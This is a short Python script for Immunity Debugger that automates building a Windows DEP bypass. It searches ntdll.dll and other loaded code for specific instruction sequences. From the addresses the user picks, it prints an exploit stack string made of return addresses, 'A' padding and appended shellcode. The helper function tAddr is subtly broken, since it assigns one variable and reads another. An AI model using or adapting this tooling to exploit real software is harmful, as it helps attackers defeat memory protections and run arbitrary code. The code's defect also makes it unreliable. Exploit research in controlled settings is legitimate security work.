import immlib
import immutils
def tAddr(addr):
	bug=immutils.int2str32_swapped(addr)
	return "\\x%02x\\x%02x\\x%02x\\x%02x" % (ord(buf[0]),ord(buf[1]),ord(buf[2]),ord(buf[3]))
DESC="""find address to bypass software dep"""
def main(args):
	addylist=[]
	imm=immlib.Debugger()
	mod=imm.getModule("ntdll.dll")
	if not mod:
		return "error:ntdll.dll not found!"
	ret=imm.searchCommands("MOV AL,1\nRET")
	if not ret:
		return "Error:sorry,the first addy cannot be found"
	for a in ret:
		addylist.append("0x%08x:%s" % (a[0],a[2]))
	ret=imm.comboBox("please,choose the first address[set AL to 1]",addylist)
	firstaddy=int(ret[0:10],16)
	imm.log("first address:0x%08x" % firstaddy,address=firstaddy)

	ret=imm.searchCommandsOnModule(mod.getBase(),"CMP AL,0x1\n PUSH 0x2\n POP ESI\n")
	if not ret:
		return "error:sorry,the second addy cannot be found"
	secondaddy=ret[0][0]
	imm.log("second address %x" % secondaddy,address=secondaddy)

	ret=imm.inputBox("Insert the Asm code to search for")
	ret=imm.searchCommands(ret)
	if not ret:
		return "error:sorry,the third address connot be found"
	addylist=[]
	for a in ret:
		addylist.append("0x%08x:%s" % (a[0],a[2]))
	ret=imm.comboBox("please,choose the third return address [jmp to shellcode]",addylist)
	thirdaddy=int(ret[0:10],16)
	imm.log("third address:0x%08x" % thirdaddy,thirdaddy)
	imm.log('stack="%s\\xff\\xff\\xff\\xff%s\\xff\\xff\\xff\\xff"+"A"*0x54+"%s"+shellcode' % (tAddr(firstaddy),tAddr(secondaddy),tAddr(thirdaddy)))

